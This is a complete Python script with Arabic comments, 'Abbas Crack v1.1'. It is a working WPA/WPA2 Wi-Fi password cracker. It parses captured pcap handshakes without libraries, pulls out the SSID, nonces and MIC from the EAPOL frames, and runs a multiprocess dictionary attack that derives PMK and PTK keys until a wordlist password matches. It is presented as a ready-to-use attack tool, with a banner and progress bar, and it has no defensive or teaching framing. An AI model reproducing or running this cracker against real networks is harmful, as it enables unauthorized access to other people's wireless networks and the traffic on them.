#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Abbas Crack v1.1 - كاسر Handshake بدون scapy
يقرأ pcap مباشرة · يعمل على Termux بدون مشاكل
المبرمج: جنرال عباس 🇮🇶
"""

import os, sys, struct, hmac, hashlib, time, argparse, multiprocessing

class C:
    RED='\033[91m'; GREEN='\033[92m'; YELLOW='\033[93m'
    BLUE='\033[94m'; CYAN='\033[96m'; WHITE='\033[97m'
    BOLD='\033[1m'; RESET='\033[0m'; GRAY='\033[90m'

def banner():
    print(f"""
{C.CYAN}╔══════════════════════════════════════════════════════════════╗
║  {C.RED}🔓 Abbas Crack v1.1  -  بدون scapy{C.CYAN}                        ║
║  {C.WHITE}يقرأ pcap مباشرة · يعمل على Termux{C.CYAN}                       ║
║  {C.YELLOW}المبرمج: جنرال عباس 🇮🇶{C.CYAN}                                    ║
╚══════════════════════════════════════════════════════════════╝{C.RESET}
""")

# ---------------- قارئ pcap ----------------

def read_pcap(filepath):
    with open(filepath, 'rb') as f:
        data = f.read()
    if len(data) < 24:
        raise ValueError("الملف صغير جداً")
    magic = data[0:4]
    m_le = struct.unpack('<I', magic)[0]
    m_be = struct.unpack('>I', magic)[0]
    if m_le in (0xa1b2c3d4, 0xa1b23c4d):
        endian = '<'
    elif m_be in (0xa1b2c3d4, 0xa1b23c4d):
        endian = '>'
    elif m_le in (0xd4c3b2a1, 0x4d3cb2a1):
        endian = '>'
    elif m_be in (0xd4c3b2a1, 0x4d3cb2a1):
        endian = '<'
    else:
        raise ValueError(f"ليس pcap صالح (magic={magic.hex()})")

    linktype = struct.unpack(endian + 'I', data[20:24])[0]
    packets = []
    off = 24
    while off + 16 <= len(data):
        incl_len = struct.unpack(endian + 'I', data[off+8:off+12])[0]
        off += 16
        if off + incl_len > len(data):
            break
        packets.append(data[off:off+incl_len])
        off += incl_len
    return linktype, packets

# ---------------- تحليل 802.11 ----------------

def strip_radiotap(pkt):
    if len(pkt) < 8:
        return None
    it_len = struct.unpack('<H', pkt[2:4])[0]
    if it_len > len(pkt) or it_len < 8:
        return None
    return pkt[it_len:]

def dot11_fc(frame):
    if len(frame) < 2:
        return None, None
    fc = struct.unpack('<H', frame[0:2])[0]
    return (fc >> 2) & 0x3, (fc >> 4) & 0xf

def get_ssid(frame):
    ftype, subtype = dot11_fc(frame)
    if ftype != 0 or subtype not in (5, 8):
        return None
    if len(frame) < 36:
        return None
    tags = frame[36:]
    i = 0
    while i + 2 <= len(tags):
        tid = tags[i]; tlen = tags[i+1]
        if i + 2 + tlen > len(tags):
            break
        if tid == 0:
            return bytes(tags[i+2:i+2+tlen])
        i += 2 + tlen
    return None

def extract_eapol(frame):
    ftype, subtype = dot11_fc(frame)
    if ftype != 2:
        return None
    fc = struct.unpack('<H', frame[0:2])[0]
    to_ds = (fc >> 8) & 1
    from_ds = (fc >> 9) & 1
    hdr = 24
    if subtype & 0x8:
        hdr += 2
    if to_ds and from_ds:
        hdr += 6
    if len(frame) < hdr + 8:
        return None
    llc = frame[hdr:hdr+8]
    if llc[:6] != b'\xaa\xaa\x03\x00\x00\x00':
        return None
    if llc[6:8] != b'\x88\x8e':
        return None
    return frame[hdr+8:], frame

def parse_eapol_key(eapol):
    if len(eapol) < 99:
        return None
    if eapol[1] != 3:
        return None
    body = eapol[4:]
    if len(body) < 95:
        return None
    key_info = struct.unpack('>H', body[1:3])[0]
    key_ack = (key_info >> 7) & 1
    key_mic = (key_info >> 8) & 1
    nonce = body[13:45]
    mic = body[77:93]
    eapol_len = struct.unpack('>H', eapol[2:4])[0]
    total = min(4 + eapol_len, len(eapol))
    return {
        'raw': eapol[:total],
        'key_ack': key_ack,
        'key_mic': key_mic,
        'nonce': nonce,
        'mic': mic,
    }

def parse_handshake(filepath):
    print(f"{C.BLUE}[*] قراءة الملف: {filepath}{C.RESET}")
    try:
        linktype, packets = read_pcap(filepath)
    except Exception as e:
        print(f"{C.RED}❌ فشل: {e}{C.RESET}")
        sys.exit(1)
    print(f"{C.GREEN}[+] عدد الحزم: {len(packets)} (linktype={linktype}){C.RESET}")

    ssid = None
    m1_list, m2_list = [], []

    for pkt in packets:
        frame = pkt
        if linktype == 127:
            frame = strip_radiotap(pkt)
            if frame is None:
                continue
        if not ssid:
            s = get_ssid(frame)
            if s:
                ssid = s
        res = extract_eapol(frame)
        if not res:
            continue
        eapol, full = res
        parsed = parse_eapol_key(eapol)
        if not parsed or len(full) < 16:
            continue
        addr1 = full[4:10]
        addr2 = full[10:16]
        if parsed['key_ack'] and not parsed['key_mic']:
            m1_list.append({'nonce': parsed['nonce'], 'ap': addr2, 'sta': addr1, 'eapol': parsed['raw']})
        elif parsed['key_mic'] and not parsed['key_ack']:
            m2_list.append({'nonce': parsed['nonce'], 'sta': addr2, 'ap': addr1,
                            'mic': parsed['mic'], 'eapol': parsed['raw']})

    print(f"{C.GRAY}   M1: {len(m1_list)}  M2: {len(m2_list)}{C.RESET}")

    if not ssid or not m1_list or not m2_list:
        print(f"{C.RED}❌ Handshake غير مكتمل.{C.RESET}")
        print(f"   SSID: {'✅' if ssid else '❌'}")
        print(f"   M1: {'✅' if m1_list else '❌'}")
        print(f"   M2: {'✅' if m2_list else '❌'}")
        sys.exit(1)

    ap_mac = sta_mac = anonce = snonce = mic = eapol_m2 = None
    for m1 in m1_list:
        for m2 in m2_list:
            if m1['ap'] == m2['ap'] and m1['sta'] == m2['sta']:
                ap_mac = m1['ap']; sta_mac = m1['sta']
                anonce = m1['nonce']; snonce = m2['nonce']
                mic = m2['mic']; eapol_m2 = m2['eapol']
                break
        if ap_mac:
            break

    if not ap_mac:
        print(f"{C.RED}❌ لم يتم مطابقة M1 مع M2.{C.RESET}")
        sys.exit(1)

    print(f"{C.GREEN}[+] SSID: {ssid.decode('utf-8', errors='ignore')}{C.RESET}")
    print(f"{C.GREEN}[+] AP MAC: {ap_mac.hex(':')}{C.RESET}")
    print(f"{C.GREEN}[+] STA MAC: {sta_mac.hex(':')}{C.RESET}")

    mac1, mac2 = sorted([ap_mac, sta_mac])
    n1, n2 = sorted([anonce, snonce])
    return {'ssid': ssid, 'mac1': mac1, 'mac2': mac2,
            'nonce1': n1, 'nonce2': n2, 'mic': mic, 'eapol': eapol_m2}

# ---------------- العمليات الحسابية ----------------

_G = {}

def _init(hs):
    global _G
    _G = hs

def compute_pmk(pw, ssid):
    return hashlib.pbkdf2_hmac('sha1', pw, ssid, 4096, 32)

def compute_ptk(pmk, mac1, mac2, n1, n2):
    data = mac1 + mac2 + n1 + n2
    ptk = b''
    for i in range(4):
        ptk += hmac.new(pmk, b"Pairwise key expansion\x00" + data + bytes([i]), hashlib.sha1).digest()
    return ptk[:64]

def check_pw(pw):
    try:
        pmk = compute_pmk(pw, _G['ssid'])
        ptk = compute_ptk(pmk, _G['mac1'], _G['mac2'], _G['nonce1'], _G['nonce2'])
        frame = bytearray(_G['eapol'])
        for i in range(81, 97):
            frame[i] = 0
        comp = hmac.new(ptk[:16], bytes(frame), hashlib.sha1).digest()[:16]
        if hmac.compare_digest(comp, _G['mic']):
            return pw
    except Exception:
        pass
    return None

# ---------------- الرئيسي ----------------

def crack(hs_path, wl_path, workers=None, single=False):
    banner()
    hs = parse_handshake(hs_path)
    print(f"\n{C.BLUE}[*] تحميل Wordlist: {wl_path}{C.RESET}")
    with open(wl_path, 'rb') as f:
        passwords = [l.strip() for l in f if l.strip()]
    total = len(passwords)
    print(f"{C.GREEN}[+] الكلمات: {total:,}{C.RESET}")

    if single or total < 100:
        workers = 1
    elif workers is None:
        try:
            workers = max(1, multiprocessing.cpu_count() - 1)
        except Exception:
            workers = 1
    print(f"{C.GREEN}[+] المعالجات: {workers}{C.RESET}\n")

    start = time.time()
    found = None
    tested = 0

    print(f"{C.CYAN}═══════════════════════════════════════════════{C.RESET}")

    try:
        if workers == 1:
            _init(hs)
            for pw in passwords:
                tested += 1
                r = check_pw(pw)
                if r:
                    found = r
                    break
                if tested % 500 == 0:
                    _show_progress(tested, total, start)
        else:
            with multiprocessing.Pool(workers, initializer=_init, initargs=(hs,)) as pool:
                for r in pool.imap_unordered(check_pw, passwords, chunksize=200):
                    tested += 1
                    if r:
                        found = r
                        pool.terminate()
                        break
                    if tested % 500 == 0:
                        _show_progress(tested, total, start)
    except KeyboardInterrupt:
        print(f"\n{C.YELLOW}⏹️ تم الإيقاف.{C.RESET}")
        return
    except Exception as e:
        print(f"\n{C.YELLOW}⚠️ multiprocessing فشل، أكمل بوضع مفرد...{C.RESET}")
        _init(hs)
        for pw in passwords[tested:]:
            tested += 1
            r = check_pw(pw)
            if r:
                found = r
                break
            if tested % 500 == 0:
                _show_progress(tested, total, start)

    print()
    elapsed = time.time() - start
    print(f"{C.CYAN}═══════════════════════════════════════════════{C.RESET}")

    if found:
        pwd = found.decode('utf-8', errors='ignore')
        print(f"\n{C.GREEN}{C.BOLD}╔═══════════════════════════════════════╗")
        print(f"║  ✅ كلمة السر: {pwd}")
        print(f"╚═══════════════════════════════════════╝{C.RESET}")
        print(f"{C.WHITE}🌐 الشبكة: {C.CYAN}{hs['ssid'].decode('utf-8', errors='ignore')}{C.RESET}")
        print(f"{C.WHITE}🔑 Password: {C.GREEN}{C.BOLD}{pwd}{C.RESET}")
        print(f"{C.WHITE}⏱️ الوقت: {C.YELLOW}{elapsed:.1f}s{C.RESET}")
        print(f"{C.WHITE}📊 حاولنا: {C.YELLOW}{tested:,}{C.RESET}")
    else:
        print(f"\n{C.RED}{C.BOLD}❌ لم يتم العثور على كلمة السر{C.RESET}")
        print(f"{C.WHITE}📊 حاولنا: {C.YELLOW}{tested:,}{C.RESET}")
        print(f"{C.WHITE}⏱️ الوقت: {C.YELLOW}{elapsed:.1f}s{C.RESET}")

def _show_progress(tested, total, start):
    elapsed = time.time() - start
    speed = tested / elapsed if elapsed > 0 else 0
    remaining = (total - tested) / speed if speed > 0 else 0
    percent = (tested / total) * 100
    filled = int(40 * percent / 100)
    bar = '█' * filled + '░' * (40 - filled)
    print(f"\r{C.YELLOW}[{bar}] {percent:.1f}% | {tested:,}/{total:,} | "
          f"{speed:,.0f} H/s | متبقي: {int(remaining)}s{C.RESET}", end='')

def main():
    p = argparse.ArgumentParser(description='Abbas Crack - بدون scapy')
    p.add_argument('handshake', help='ملف Handshake (.pcap/.cap)')
    p.add_argument('wordlist', help='ملف Wordlist (.txt)')
    p.add_argument('-j', '--workers', type=int, default=None)
    p.add_argument('--single', action='store_true', help='بدون multiprocessing')
    a = p.parse_args()
    if not os.path.exists(a.handshake):
        print(f"{C.RED}❌ Handshake غير موجود: {a.handshake}{C.RESET}"); sys.exit(1)
    if not os.path.exists(a.wordlist):
        print(f"{C.RED}❌ Wordlist غير موجود: {a.wordlist}{C.RESET}"); sys.exit(1)
    crack(a.handshake, a.wordlist, a.workers, a.single)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.YELLOW}⏹️ تم الإيقاف.{C.RESET}")
    except Exception as e:
        print(f"\n{C.RED}❌ خطأ: {e}{C.RESET}")
